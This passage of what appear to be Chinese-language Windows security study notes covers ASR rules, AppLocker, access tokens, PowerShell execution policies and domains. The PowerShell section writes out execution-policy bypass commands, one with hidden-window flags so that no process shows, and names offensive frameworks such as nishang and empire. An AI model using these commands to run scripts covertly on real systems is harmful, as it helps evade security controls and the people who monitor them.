未配置：禁用asr–&gt;0</p><p>​                    阻止：启用asr–&gt;1</p><p>​                    审核：评估影响–&gt;2</p><p>​                设置asr规则（powershell下）</p><p>​                        <a href="https://docs.microsoft.com/zh-cn/windows/security/threat-protection/microsoft-defender-atp/customize-attack-surface-reduction">https://docs.microsoft.com/zh-cn/windows/security/threat-protection/microsoft-defender-atp/customize-attack-surface-reduction</a></p><p>​                查看规则效果</p><p>​                    事件查看器：eventvwr.msc </p><h2 id="9-Windows-applocker（win-7以上，手动添加）"><a href="#9-Windows-applocker（win-7以上，手动添加）" class="headerlink" title="9.Windows applocker（win 7以上，手动添加）"></a>9.Windows applocker（win 7以上，手动添加）</h2><p>​            应用程序控制策略</p><p>​            启用applocker：Services.msc-application identity</p><p>​            查看applocker：Secpot.msc-application control policies-applocker</p><p>​            applocker规则（阻止的文件）</p><p>​                    可执行文件：exe、com</p><p>​                    脚本：psl、bat、vbs</p><p>​                    安装文件：.msi</p><p>​                    dll文件</p><p>​            applocker规则条件</p><p>​                    发布者(数字签名进行标识)、路径、文件hash</p><h2 id="10-Windows-access-token"><a href="#10-Windows-access-token" class="headerlink" title="10.Windows access token"></a>10.Windows access token</h2><p>​            用户访问令牌，描述线程安全的一个对象，不同的用户登录会生成一个对应的令牌，用户创建线程的时候会进行权限的拷贝</p><p>​            组成：用户sid、用户组sid、用户登录信息的sid、其他信息</p><h2 id="11-Windows-PowerShell（win7以上自带）"><a href="#11-Windows-PowerShell（win7以上自带）" class="headerlink" title="11.Windows PowerShell（win7以上自带）"></a>11.Windows PowerShell（win7以上自带）</h2><p>​                内存执行，具有隐蔽性，易于绕过杀软</p><p>​                后缀：<code>.ps1</code></p><p>​                版本：Win7-2.0、win8-3.0、win8.1-4.0、win10-5.0</p><p>​                            <code>get-host</code>：获取版本信息</p><p>​                策略</p><p>​                            <code>restricted</code>：禁止一切运行</p><p>​                            <code>remotesigned</code>：本地ok，远程不行</p><p>​                            <code>allsigned</code>：拥有签名的可以运行</p><p>​                            <code>unrestricted</code>：允许一切运行</p><p>​                            <code>Get-ExecutionPolicy</code>：查看当前执行策略</p><p>​                            <code>Set-ExcutionPolicy</code>：设置策略</p><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Users\administrator.MCITP\Desktop&gt; <span class="hljs-built_in">set-executionpolicy</span>位于命令管道位置 <span class="hljs-number">1</span> 的 cmdlet <span class="hljs-built_in">Set-ExecutionPolicy</span>请为以下参数提供值:ExecutionPolicy: unrestricted<span class="hljs-built_in">PS</span> C:\Users\administrator.MCITP\Desktop&gt;</code></pre><p>​                绕过策略的命令</p><p>​                    <code>powershell.exe -ep Bypass -File .\powershell脚本</code> 此方法会有一个进程出现</p><p>​                    <code>powershell.exe -ep Bypass -WindowsStyle Hidden -Nologo -Nointeractive -Noprofile .\powershll脚本</code> 此                            方法可以避免进程的出现</p><p>​                常用的脚本：powersplit、nishang、empire、powercat</p><h2 id="12-Windows域"><a href="#12-Windows域" class="headerlink" title="12.Windows域"></a>12.Windows域</h2><p>​            域控：DC，域内主机都会经过DC处理</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAWEAAAAuCAIAAAB25D+NAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAEnQAABJ0Ad5mH3gAAEZpSURBVHhe7b13kGXndR9488vvdb/u1zl3T/dMT+7JAAYgABIgIJM2LYIWKdn0WlLJVVumyy7/7f92/9va2lqttiRtWcFUsCybpECQBMBJwAwGE7qnc845vJxv3t/57uswM93DGYhUbXn74M57N3zhfCf8zjn33tfgOV7gvgjxpe/nIbv0/RQdeOHFyeFnh6tnj/xLnPf/I4QVPSGBvfT863XGcba/P9kHs/NLGf9XTWD02aJ7QlDPL2eHXrT9ixP/S5Azz3mCpd0dEsXSzkFkPyGaAwj8odXTcrB3TmHnADHttnmc9l+zw4+zOXTwyETPmLf0/Vy0Ly9P0961/CrG36W9EthLB/jqgYSw8SKR46BF8biw7zVws2f8x+TzHAISnmMx1p5xnqf9/mSxbT8iPjEs28gdGB243oPoRdu/YHNywC+WATDa1gXf891/4+y9CDnS+QXE7/Hnva3tXTs4UEbWAbYiHIiLUNVey7Y4fl/torsz6WPj48AZlz53Dp5BrA3zPLKLZze3tu0VzV5IY1hAqefz0oGMCC80MRn9c3Vw1u5sT5MFNfIlZ3Ko1N7mRX43Du3YA77MUvPSmT37O2dgA8Ley/uSZe9qH+1Ley9KZEL7Y0TJPkvB0tnoeC+fz0GwoBdoj7YvaD88J4iY4CApPZt2ZMj/2w96nb0d2uPDB9GOUJ5FezFiLz0PRjxH372Ek2gPAQqlXVItttLBU4Tzzrb/LM9BTl824y+inbXQF8MVdH42ldoQDP1y6Dl0+kXIkYKzqKcJAEEzO20Ybe/Daym4OzztwQie3x/MaJzS7p72z6C99vP3WPtj8+6lPeNjZ2c7sP0B9GLtnSmdaZ5N2214hCfsOB2/MPG/98lyafcFCJP+4nn/ATHCQQR0gYXh0xm2hIIvQC/okzxlLr+oLjt4Lf+Q9IJ+4gjwl0D7jgJxAAxKB8TbjqaQJj4DI7CRJPe0P5AOGP/5ybEi0L4rcMZ3LmEHm6NiTLR/++0GTxAafwHenpv43Rz2CxC/XaPx37y+6uztS0/laZgSPZ1tH9rLk3BAHbjbhnK5L74GRpgCI5hs28sVTj5j5L0td4k6MJjY59rjVGpjCyIvOWeeh57N09O0P5e/MmK5JSZ02Nyf031rPWq9L6O2wLDJGdOh/cd3GuFjbw2yh3B9f186qCb9ZdHBte0OgeEdHwGTsMOnaQdEniDbsvdt/4Jy3ofQjpq/KD7uG8/4b1xfK+3uR/v7eakM26UdRe2NV1gnDpx2e1tDr84hy4NK7Xca7PZ/Jj02PcpY3kKVu60MMIG81Xq8zZ6RSy13CchArDx3HoFmGIKHTR+QRzgNniBn/L2XnOmebukQTeG0eF7aZyQ2AH0cNMsO7egF7Zlq9iEnZjjtdnh7el3bRHcjnhiItcHpfWyXyfMxvWzT/syAXsgHdkqip/gE7TsFXOYxfrYb7QgK347JOSccjNiVBLWjPvCi0pnHCRixP//7Y8SBct5h7DEiq7bNEgvPR/veu+F//fqzao2dfOMxohx73zU/prMd+aLp3tbPE69ekJxxMJ3DGPYxxf7SZ/QER7vcPIkrzyTB5sRfHGd2iaZ4kfHhhC/SHHSQXhyB/AJ6npj8K84jXkyeoF9xHgHz3zcGQJgOy47A4YzskwdAGKUmj9HeXGMvPSOP2Kf9k1L7ReRgROng+Whf/aLWWCrtPkVYNMs9sDk2UFIImRvO28412tvmn7fIyag9NdmpZ/bYOi5Ar85wsCBaBk6yQ+pP3wcSohKbi9rTONsd4av4hsM6932xj0KM50x6tlHik7FKE9Bs21Oxe2qlOek69XGOHifWbB/C0JApDVQ6USKBzQgGLfZshU0GxrBhsbu+ujMx2Gdb6cwewrl950bDvW132pTkg9mZKJDIsYVvz4sFOnNR0+0hSEBsA3bjJNow/vcnWu/2bPh25L99Ypdwmp3kndxktwsxUNotfe8hasmGh2KgU8dLwLfDzPaYRHvHZyeei0gizPbIctgZZ+Td7ycJJkxc0GVHaiXCrBgAJ+gqu8IusucgtETnIq2DTu+0LDXbbg+lPIUROM8kRteJX+csGxmTshXsnt2eZ1cPO1ccOhCDDqL984hvXV8s7T5FzMIwKzZMTxv9c0RMVi84zsAsDKKBhcFLd+vzfXMKjABbNCy6JAtUzaMz1uGsErRjT48RTYLsBQWF6bACZ6Yp2UXRxujoJ1hMiIhFAqVYlsnzOpYtyAJMzrQYB+hBs6G5KGA82zQBIwKbnkcfOD0G35H0zv7OmX3JkexO3ijagiJIFmcYnI4RDNPEbKKgbM9eoh0ABtsQ5M5ce/OsA27p0DJLu3vI5gxBsCxgo8WLkmIaFhbOVo0vAbJzQJPBBK2Y9nDRskSe3okxLZ2khtEhz9JSniSwjAHhwOiOQaACelppMayk1TxGjk7xQbfXGWFUdDmIcIWNiekFmedFC4ObBvT+9NCMwP6e21+P0d54SPJnJNq2xBaoMTSkGOZIgPHI2u5DdI01c9jAvrN2RwvE8ON5MbWhqyRzslrTYqec09gc3dFGgoM9YJcNx3IuIvRiMziSxhpJbGwDC2TdTrNdImsv9QU5bNJ4wAjq9fcl/r2DMWI7npCIMB971u2sDQeWxPGKIIIjA85Ysocd9CdiimA71IldZwRZOOKQOFtkucETGIHd3RWXiM7BlR3cIQaYtTnNaHg64+QRlB3C+7EZPGfA3kSJwpJJ3ZmF0AZsEERInNpbBDs0PfzH2s8pHZbYFCXa2WdXiOjMro5ZF/gZiYozyUYlpl202c1FmS6doQiNS0wQcyW90iAsGduZt0ROOyI2AY4d8SHXBRAAJGixvChAuuhOlzAX1Idx0bDUhREsWIIpE2N0TwdghqsORjAMeWxmHMB7cdbRMU2DYeEKOGAJJDVgFuzsU2ealmmFudYuA8w2HK6pEx3RMjAmHIGmYebGUk4e+EoN0abUvrRPUaEkqscJEzFdOMM6eIFPAARp3iZ7pQbsgtNmm5PHCFfYPGwjXTBzoZN0VGqEQzJ0Og2O0IZdQAOyVexDPBjEKo3EWjF5sA3c78aMPfbjsEPeRH1ppWgJkyYtsiYlOTvu4JzCp9PfWRZddPKInQtflFBrPAMjHGtAokN5OCYiQdGcPAxLAipjiTxQGeuE6ZRY2yFaAPowy6CcY+eqBU8krfOWASvGyGhAAsaZvbLfj3bkuJcc/MIcLO6CDUACYQRc08ASRJmdIPd3ZkMDJlxmi6LkBBUMgwvsHZ4niVgt7T5G27ZCffFvJ08DP6ZlYDqaEceUcNNcsB/LKmEETUMy2Id2bQW+umOWJaL97fViHTQtO0kbnBwKYRdoUmAS43CnAa5gc4TtdCCxAETBCTwH3RHDcfWgPILOMQOELvFpIlPG0fYZ0BPaoQNmy85VQURmUFK0iRxrD5X4gQoITylDxUlSEgbEschee9mHnr7fQYQDEvn2sCR3AgTCQppXYHezsURSOFkLyXO/CchQ2A6ag9hCSaDYZedoHjq1vWo0h0odq8DmYD1WjU/soxEbBx8kP2YalBfTOUa7ei+NzgahhvikuSgGEq+lZnvI6cE64WvbDpkx7I7/hemZGIHL2/zAGpxd58vlcsFGoFINH5RTEQZAPttSJdpZDFnGtj/QmDBfxwhMciSIecd0aKG7A+xDTmpSGmt7B4KAfTtZDz4VGYkDmQg4goR4AVAmMGZNTMlgjRgwKA6Cb6lkkWwoR6/PScz9qK+zcLZEGoYWIjLzZWEOOxRemOYQ5J2JmAlvi5RtO7RrBCWMeJLImdlEzMQJnWksnMfwli7LMjII2CRybDgcJQRoQw0oMgucSUmWE+JIYiJg1IT3iqJOwiFtwBaZGz1JOIceYIgaMB4xM7yRTIAhIGu1S2iCBjAMWgMl1qQVpmv0Jn7xj2nK2bAPZEcnMItyTYBdQWtMes54+xFkxXo8QSRvNgc24AKYcyQJ+yHGoR3GudMGxFbzJNHJPSPvWSAGZ/IkPMUgcGHGP2e7XQoJDwkO8AiCRUww8U0PyRlKUN+djbIDgvUS7eidcYUPYgAbIJJ2HEkSRpSMymkMYgKm9g5/u3zCTvZg0Bcmsfu7/660uy+BWUcWnK2IomibiggTgZ1hbswPWwIeU0ORpaFO3gkmsUE+jizxaZmGLIkSQQKrMS1T19U50Pw8UkmP30cdHCoJkE2N4WDlTLrYKG7hhMAbiAZoQMUDJsAHZQ0oqAXLlAXbhVlMQyvk9WJRKxSNoupxufweD+blbEPCCKhINXVmdnZ+fh4w7wv4ARcMHRxNP7mRPjAX+5QkicyMXYDWcMh24T4m4hOrcbAD0QCJiGGKV5Q0Y3A4EvZoiSRQslcsjA3FPvBJx3BjItTO6GQJEqo5tCQ7o7mYMpx3nHF+RzVsg+frMjzL1JE4oTMqedgmygcCQZqXukqcKUMI2DhDtq3o+gaUoNu22++H2tAA6ILehDIwfYxuW4oiA9qopIDkTR1rwJoxoprPz83MLMzPwS4CwSBVK6wLuSfbdxZGHJKLcqpWnJufW1haMC0uVB5mogA08bREqqhNQDtcSREFRZIg0LymMqkQsKKFoyAmpNIOEykzgT0b2ISZwRIwmluWbFOHJBRJVIv5xeWl+YU5USaNgy3SAHkp8UEHDNBFcEOipiIatkpI75yH7ZM6nXmdlcFjSVwKeOY5F+YFo6payGaKhUI+l4MMFcVlGibdQgBvMBJK1Eo3wrDD6jbyI0dWGB9nIGcmQpqfLIq3DU3DilySTLc2qCX0KaI5MYAF0zgAbac7aQ1nYJKkBYgeSmfwzZhGjy+yice/++8ZP/tsxAOTBTiCLERTd0s8TDCztjrV9yiVTLsDIcXtJUegRVGAwopIFmyjep8msVE1ukQhGdtamp+DWEMBHyJdJp26cf16tK9f9/kbG5skWcbiMCkLbtQPn/BcBH+KUYQMAlXOBE80JhvaURh4M2UOdm9CW2BvaWZ6cmR4eW52dWlxCZ+LS1tr6y5JCvi9MEFwiNRV1/Wf/eSDWP8jM+Bvam6mbJZMwkAzfGM+bBiZJiKV4APWTK6GoCSCGyZzHLLQZ2FYibzLkHhAFbzUjG9sri6vgEuXxw3zAtt0nsUByamuUQk5K2HBk92a4eneIXM/8hkW6h0Zwn6JA8Ar7RCIoAnddrEd1dgYHFPLvKlYRnxpeeJRfzqd8ZWXC7JMgZ/dy4W5oxkAAm0AEIQRlj3U96j359cShn7s+AlYn2CTa1HeBVu0TOIUfsI0AZboQZrAZmQMG8XCRz/9IDrQb/t9jQ11aAzmKTeEqaAZaRFcceT5TErxWPSTmzdiQ4Om29vW1o6rKDbBNmfqIuSGJZuaF95pW8uLiytrKzKCMuEilG5BaCVPo7hNGxRGUAV7wD7bZEGEBiETNy/IppXY2tpcWysW8uHysrJQcG115eaNG1vDI7rL1dLSBGUyf0NHErhMOoauwQytGvukCBK9TVOjBRWJMHTqQipgqnP0LvOWF/HTMnLJeP+D+8sL88vLS8v0bymTzYbKyhDDEMBgrsxtsRrSOLpDhEgRmLrpDGbBJwmcggLWBZvBZss8F11bX5qdAz/AYvBkGroDJlgFGYljNhA7jY5xHEEBS5E422R+mBgDEs9fZBNPfvc/kM3vu5Wck4dByJzlEsgQ4YQjd+/2/uBHS5vx1u6TwfIKgldK4A3B0qFpWpUEsBbYxiuS4JFFxbYH+3of3bnt83q7j3VBGdl02tCNgqy0tbbW1NRgJQjmTGHEFtk0x8miJEsI/BABoo0Im/DgmO2TdUAKEBjZq6nYpgtxQ+TNQuHGRx/ODgzmimo+lwUGF7LZ+bGx0b6HuWK+qqIM/MDb0S2VTuZEvq2tpaIyTDFScO4rEszDLBj2QsoWpsecLlnCcgBSpEXyXlItuRyp0FYEziXaHokDJ240M4zx/sGB/gEw2tnVCVskZVsGxRyRSUaiKRxbBP8sFpEvORLDsG5JQuiDrhETIA02I8Ij+QnWTg/tLfgq3ah32CCAgIJ4y81Z/bdv9//4J0tb0dYTJ70+PyyQXMhpBoCwDZ/EgVXgtE+WJ0ZG12dmfHV13SdOgBlkYc6KEIFlgcfGcN/EIfhRXPQYCmdY/KQx0+lUXuTb21qqKisgKIWeIUFrAiQJr4PQaI2kVuoC+Mhl06bH1djQWFNdTciOpE8SwDkEiH2FbIxzS+KNjz8eGRyI1NY0NTTAnCxDRzOIDsPypulGYgP9mAZG9kiS1wW+gCz0RA2NFYH3w2ZUbWxwYKi/HxZ8tKvL53GnEolCvmC6PQ0N9fV1deCMkiMKgQSynGXAFZHCwMagd4wMm5fIeklfDCxYDKfYwCCJ5Il8igBChs+qhUcP73968yYCQzqTRiDJ5LIbAwMbxUJHR4ffhxAJQ4LuoHoR/FO8IccGEAOsbZoFx5T7cBAaDuHtJByRczKUkb6+R7c/C4RCtY0NlI9DrAxW3AoKS3DIQ/jogqQJ2oEWyJZgLRgGn4Td8GI0Jyv6Apt44rv/4amTJYzYdldwY8ic5hVtr2glN9d67z3MLa3RTYDqmuq6WgiO+YAO+/OwOIMiDJFay2VsLSeaRdFQObVw/9Yn+clpd3lZQ2O9rmoIEk319Se7j9ZVRyBkRADCJIYRGAFqQ17AmzpVKbqGBCGgiACIfD6P5A0lN7jToTW0Rb3GYMIFaXK8XlTv3r1vZYoNp86d7Dkfqa5qaW2WXXJ0djo6NWHJUkNDg+xCQ76lufnk8e6q6krL1mATblHyMkAq5PNqsYgKB0qFYyscGaJRpOdlUKXb7UGdApkga8B6/ZRYaYaaMwpZS81JtibbuhqL9X92NzE9bfgDjU1NFJDJM3kfUk9RyMKvcvAs3i0pTNSo3eDePNYIJwfSIT4j+iHTgcUSUFNsIVSCEcANeKqLqOhiEY0sGj4M73Lzpoe3YmsrA32PsotL6KTU1NY3NlJSSuELlYXhoiRC5/WCrRYApnpe3VrfWpydCzc09Jw9JXO6CxiHoQQul0raWhFgAS2gdsPUhRwwtuBRKJV08hrE+KbGphPHj9fWVCsiT64OkAKeiiLguZjPG5rucXmwUioWONvrdre0tHQe7aqrq7UMDWyjJRIHs1i0dc3SipCnqKtWPnvzow/N1TV3dV2kslwwVUC/B4gDM4fGTbOQy6JUdcm8B44F4WuqoZNv+OExFJZ1QS+kt1aGHt6Pjo26AwFgArDM7XUBcbqOdFRFKiFBIKwMc6Ocn1I/qhQo4yJzA2OSrSscXFTQNQ0ZPjzR4/EVNR2VNSyUwQrgWPdyhgeurWqf37334PZdVVSOnj7X0NrR1N5R09iUdcmBQKC5qUGhpEun8ofSZA5idHk8QAsYNizfzXE+AIco+LxutVCAnHnT9rgU6Es0NdlU+WK+786dzMyMO1zR2tEJw8CcLGyj8Edc1mHzbsWFAGIYKpbEghbvlmVFVnL5oqpqmk7P4NnkVBgctDF332cTj/+Lfwf9Pb1BENiAWIjNgq15RKSpmmLrn/z8o2Q6V3vmfIITErlcc2sLYByqckHlYJoa8zPTs+PDQwvTk1sr82Y+gSA/Pzkxcu8+l8yokoA60zRNr8tVzGVim2tBrwcSHB8ZySZToWCAPBMJpGXk0/H5mcno1mZFuLy2PJiPbQ4hNA8Mjo+PxaMxt8fn8QZsiv2AeyzRoDyC4wzNuN83aIue81/92pmLF8MV5TW1ka4jrVU1kfGpyc3ZOcUXaGhqRtqwsrSUisV8Xrm8zKch15iYjG+uq4X81OTUxPgElFdZFqwu84OPyeHhgd5H05MziUQS8kBQUgSgku4FkBSyKwuz/X0PF2Ym1lFpF7NwwuWJyTHUUNmsCkTQNISFoEcu8yh6NjMxMjwyNDw7M7O2sqrmiqFAAJZha5qRL2RiG5uLc+no1sriwvT0dDQaTyQSqUQSJRIFFujKsnLJ9NTYZDKT9oaCCNMGfBXlFW9JpuZBUBU55FCpTLbm+IkkLyazubbWNjI2zhBhzaItG7pVzC7PTd+5eX1rbc2neBfnFjc2NiN1dRd7TuXiGxMDfflEFCi3MDN1/87tXDIWCQXgohura4MDg1Pjk5lEyuNC/YQCSoL1pVOp2OYmgLU2UgHfnRkbQYZvG9bi3Gx/78P15RVEC0CJG31kuZjLb25u5PM5pPluRQp43MV0Zn56enRgAFlDdH0VEBlyS1NDA2P9g0hMs7yUTsYCLjGgSBuLC5ur65qqLcwvgBNF5qsiZVouPT06MtjfPzU5sba0kE8nA17FrfBaJjbad298aMDOZFNF1UT14fVouppOxuGoFPksbmx4BPKuDIcpW6M7OFYqFoVeMqkE5F1dFrTymdHBgUcPe+dn57a2YpYtwN4QI3QTiZXlkWyXWfRzBq/qvff67l//hCureOdb3+k+f6mupS1cVROKhNs62o60tyIXcMsCEiVO06dGRh7e/Xxudm4zFuUlOeT3lfu8WjKxOT+XSSZjsa2VpeXx4ZH5mRk1m60K+cs9Csx+Znhw8MEDG/mJxeVU1TB0v89dFynTM4mJ4aGHn9+fmZpKxBM2Z4YryvweJZdMrC0uZBOJzWh8YhZ2PaUbRigc5kWRhYsDNxaw9tnofgQg5inCNeqCnIZuwtm6k8dymnr9o5+73P4vv/NuplCMz86U19UeOdJmaQXB0lAOYm3Xr996eO1WqlBEbrk8P2MUcjUVFZl4YmF4jMsVDL+PU6RwWSgcDN6+eaP//v3OtlaA4gc//OHi9FRLY0OkMuxTZAw13P/o7vWPTdPoOXWimE7+9X/+04kH91OZdDYa3ZqcnJpfrIxEyisqNXYnEj4AjJDpZqR2/2EfcpyGk6crKyu0Yg5xBmGqvqJcssz5wYGVePz8pYuSy/XhBx8MPrxfVRE8d7I7u7X18Y/eH3/UvxlPpJOpdCxaUx7sbm2KLs//+L/9zcCtWygsYT2rY2MzC3P1VVVV4VDQreTi8esff/zgwUNgRy6bySQTeiEfcHuy8cTU+DiXz3OBAOd2VZQFOxrrs9GNaz/72VD/ILIEpEbLwyMLU5PIGpsb65BPqrlM/93PPvvow62N9Wwui1CTTWUmB4eWpqbqamsiVRWID5JlDT8aeHjteo7juk6dQCap66ptagAspG8ygqNa/OhnP/P5/G9+5auZvBpdXApX1xzpaOcMVUIZaBqJjbWf/vhHgwN9WrFg6vr89Mzk6DiXyzYf7TpzvCu1tfbxB+8P3r69Fd1Cer8wObEyMxVfX5+fgieOpFLJ6Mb6ysgwsuj62powvEjXPrl+DWxHKsounD6BwT98/+8G7n6+sraRg5qS8Y2VxemRoVwu09LSXBOJrC0t3b19a3p8BKJrqqux8vnbH//8808/SWSSqqYmE3Fbz4cDnhVU8hPT8D7T5XV7lNryQNjr+vzWzfvXbmykc/FUJpZIVFdX1lVXbKws3f/ss/XlZS2fW5sYnxsaLJpqQ30NFD3WP7A1v8gZFgeXDgSQucg8/+DO7cGHDzpaWpDa/OwHP1iemW7raK2OVCBVhG0P9/V9dv0GsvRT3UfTWxs/+q//Zeiz27liIRGLrY+NTc3O1zY2l4crIGbKVsyCV7Ag9o3VjZ99eM3Mq8ff+HJLVxeyTd3QTFND9Y0KRKL8jpMNLb66dO2D94c++QSJcD6TWh0dnpqZbKyubG+ozWyuP7j9ySc3fj4+OYaUE1nkwtDAwsigrAiNNZWwqJnJqeWpGQ6ZbCAgumS/x9WKXtH1H/7NXw7fvQvMLWQyy8OD04uz9XWR5trqxMryo8/u3L11a255NZYvFjTN6/PU1tXRnYNtv9+XDrpElfn+RKCChIKeFCJHQb0X9PjmJucSK5s4RMYZKQ9wemF+cjQX31IgLwUVrDA0MDR1+y76Xbp85fzFSydPn21sbK4orzja2VmJrNvjrm1quHz5Qltrk40aLp2yUkmASLnfE0CgnJueGeqXLa0i6E/HozAmLhFDBuEytQef3kwuzp8+d/Zff/e3fueff+f8xQt2bGvowUNIBwiILIJSRpb5EONYE1UoyLGQZCGhQ27GhcvLW5rqqcjLJhFwLE1FOs0lE3yxGELGi/bpFLe8klhcaWtsfO3iuePN9XY2Pjc8sDY703Ws69/83v/0299578jRdjOdmBp4BP+3C8Xe+w/H795X8+rZcxd7zl08ffZcfUNLY2NLc1t7bXMjF/KF6mou9Zw50dkB/7l9/drU0BCqx5evXPrql9841XOa04t9t289+uxTt8gFfe6l2VlucjqxFWttbL5y/vz5k8cJlCdGV2cnvTKP/N8qFFcWFritTbebbhegPEYAx8aZuiJJ5WXly8sr+Xjc0I2A318biXCF4vzkeCYW9aJEFwXFskYHh9ZHxlxu7+tvvvnSKy+Fw+W2VuAIPmizVbWQSnHRrUIme+zIka+9/VZtedn83c8mbt70SOLVixdeu3wRtd1S773Bh58LhuqyrWw8yqWT8DGkkIjGxVyO29yKra3B8X7t7TcvnjnOpTZn791ZmZn1ihLy+UIinl1dQq4YlITp/kdjd277va53333nq++823ak0+v3V1VXdR3vFiojnCTXtrSd6DraUlfjQlKZiHLra/GVtdr6hisvv1xXXw8XxNKrKytevXzxe7/729/65jcgiNH7ny/MzYWCZUePdocbmzmvN9jeduZcT3trq2RaWjpTiMd4rVjhQ6GQ5xZnFqfHbTVXGfByan609wG3ttJUWRkUpeGHDxGKO451fu9f//a//M57DUfaUGsN9fVmk0kYOSUj9GoPJwrCyMiItrXpaW0F/8joNKOom0XDKBpaAdW3hFICJaSpw+c35qaPdnd+73f/1W9/+1vdJ4+Jxcz0YF96YxWImU3FuZkJLrrRVFf1pZcvdh7r4LRs3707SK8C/sCpMz1ltfUQSGtrI0Ta3d4o6fnp4f7NxYWjx7r+7e/9zu/85m90nThqpePDvfcyW+thn1tLJ7nhQXNtpbW9/dzFC03Nzex5DUMB+PQL0kEYYVMNye6soiKVUeRYXHIrPj+NXD1YV1MD3Zw9fjTSWB9bmk+sLFYHA6jfpicm+/uGuFDFS//kn568cPHYmbNvvPX2xcsvhSOR6rr6xrZWeGpzW+uZnjO1dTWCJADeIGZE6JqayEuXzqHUnhkfVrOZcr93dWEusblR2dL8ytnTmeUFBKuK2rq33nzzVHf3mePHX7lymZOV6MQkcl2/1+es3EmYsMvKeKyLAMNC+cieI4qi4PV4OJeCVAgln60bCvJ3uhvNXiYWBBVDeP21x4739Jx9/bWXWhqqZ8aG+/t6KyoiX/nKV052dx/r7PjKa1fLve7x/r4k7HVt4+H9Xs5X9vVv//NX3nzrwtUvnXv51TOXXgpWVkfqG+pbW1w1NQ011RfOnD7e1Tn8qH/szl1fuPIf/8a3ey5fPtLZ/p1vv/flN17j0vHez25r+SwKCnpYWh4+e+HSlZdfOd1z9uz5nosXejivsrYwo6YTAZeysri4sbXJtTR3nTyp6hrAT0R5JQkomwXLikWjUxOTvMtTV1cXLi87d+pEpL5mfXZ6dXqiLlzmleV7n90b6BuWapr/6Xu/demVLx0/2/Pld985deECqSCTlkVJEmVVs7hI3ctfevP8pZfe/MpbV197jZNdnMf/ypdeB6y8dvWV1199BYKemZxEUYYO9LwQkrU5YB9sKaeaXHmk5+prl156+dyF8++881bb8WPIU+ZmplPxeNDjV0REVtvn8XhkZXN9nctnm+vrz3R3X75w4e2vvnv1tdcll7uuubW6sYmrruk6erTnzOnWxkbYd9EwuUCw4eSpiy+/curM6XBFhW1xDQ0Nv/Zr737plZda6qpfPt9zoquTy+QWF1YkxdN+9HikoUmsqW09euzUuXN1jQ2yoshAVllGilRZHrx4sYfzuRanJ3LxaHnAh/Qtvb4c6WjuOXF0aWbq3md3KyuqvvbOPzrV1XWys+v1V17xlYXWxkYXZmaQH1j0wgUwGz5ixWJx7ITCld5AiMyJHo3A9KgGdgsCqj/kGguTk8hrqsvDb3/5zRPHjx3rOgJDigQCo/39i4uLSGk5SeEqKo+8+lrPpUvnLlz46ttvnTh3rhiLDw2Nev1lx0+fq2/p4ILl7W3tb73xKlKPqcHB4d7+ynDkzTfewIBdHW1vv/ZaOBSa6R9cXVjy+/w67N7jDnd3X3zpStuRDiQRzs1vByDIWZh7PLkdAB/7YwTGgxCoyjB1QVcVy0Siu7W2vji/VFFRCd24FKm9qaGjodaIbk4PDZR7XJDI2PCoFktWtR+pa20v2FxK0wrI9GSXwQmqbRfYc2YNERsVlWmwu3AiZ1kFTS0rC9XX13ASp66tpOMxG6n44oK9tdlUV9tYVbkwNmzMz8YWl27e+uSP/viP//CP/58PfvpTbnGRSyU1VYXn04N72qiiYs8wWQKEfbp5TGBnW7auo5C0RMWF86RjziazRiy2eUFyFejHFXCPqqaOTpfXYxmqbRRnJidik9Nbq5vXbt7+v//wj77//e//9KcfxMdHua0Ns1hMbG5x6Xx5W+eRk2fSmpnWrLwlFG2xaOOTK8J8oBV8GMiTcplkCnlvfWtbXceRnGFsRKOBgO9YZ5vsUYrxaBYL0XVblrlwZVVzG7jMFNSiqTe3NUnhUGxxPrq6YhSL00g0ksmKo10VdbW0PMrvnPttdLd/c20dhW5VpKq5uVmSpeb62q7GenNrbXZ0EHkKQGR6apZL5Ts6T0VqWxKoZnTDEwrVwBsl2TBNl9tDT0h1kyurrGpqs2VXNJ2xiKUKriLiD0dgdpCh3+vB1LpahJNAvvRgyeKQrPEo6jmJ2KmsqW3pUPzBeCqlW1akqopT5GI+Z2qagGQP7W2+UNSKql7bUM/5fSP3Pv/LP/mTxZnZynCF1+tHzV80EKZROwIDNV1TSYGcUMBMZeG6tg7Z41EhG8OQZaWsLBwOV6Ba/6s//9O//au/mBod5QqqJLoNTlZ5IY86gxdVm1NhckwdmmHAjXOFHBRz4vhRJJVbU+NJwK5tLa0sc2qhva0x4FVmJ8ft5ZXoevT2nbu///v/1198/y8+/vDjHIQfixUKeVTQwFP26IZuoeYKBaAGK/UhCbY+kGVBI6iXFdtSbHNieCQ5Pb+yvHrj1id/8Id/+Kd//uc/fv/99eEROxY3YSom4jAwoqqyodkQ5Wgy7Q8Ea6preW8gW9QKhg3g1ZG/iXKhWKTneqY5PzEZm5yJrmze/OTO//5//h//6U/+008/+CA+Ns4lUsiei8idYdv1jY0dHfTaiW0b9EYSIiGx5hC9ZrS9sfh6IECAnsYIAAr9g3ux5wX04JpcWdO2NjbX5mbWFgCLEz//6MOfvP/++PAQt7I8PzGRikVdikzP8ji+rDzsDQag5ryuaybKMxPeic2EFOkZE2AYeSK9DsJukwh0l56zA2Uhf20NGF5eALYuZlHMu90Nzc0YMZNMEl+a9mhk9NH4xND09NTcHNfY4Dt72uv3wgMJHrZvsuI/WgCWDGSArLB0+t2GiSl9Xj+SDARGr88HJYM7EhEkYIu84OJENye5FI+Xnq/pqqGpxWKRE4EpytjM/P3hkf6JybnlFcBzU8+ZcEU4Dq5MS3J5swUNIGhwvA7DoPtZAnaKpk1LpoWaqWw2DUviBc0WkwUtXVCxukw6iXyGR7JmGigpi/AHKM7t0SUlqRlwYJQMtVXVxxAbTTO2FVUNYw0hixcbW9qDwTL4G70Lb9syQE43UIbEVtdi8wsbS4vjkxMf/fyjD378/hTB2fry4uzW5qpt62QLitvl8QqyUlSBriokn8UaOY6iK89BTPSMSJQgFxSxBXqAJHIAhUAANpfXdPr9G7yARST2yaQHGQr0UotJ2hQ5Ht0FDE2qt2zZ4+UUhW4q00sBUIvEuX0FW8hxXGvX0RPnz2GcqQ9/9vv/6//yZ3/wB6P9g4IgQ2iWpXMSlEnvg5CJc7wG4bgQiAB3poQyxzK1bG5seOSP/uiP//a//+3I6NDYxKi6tUFmixAuCJQcguj9WwuADus1dQ0mJ7ndmUJeNdS6uupIXQ1XyMc21xcWlu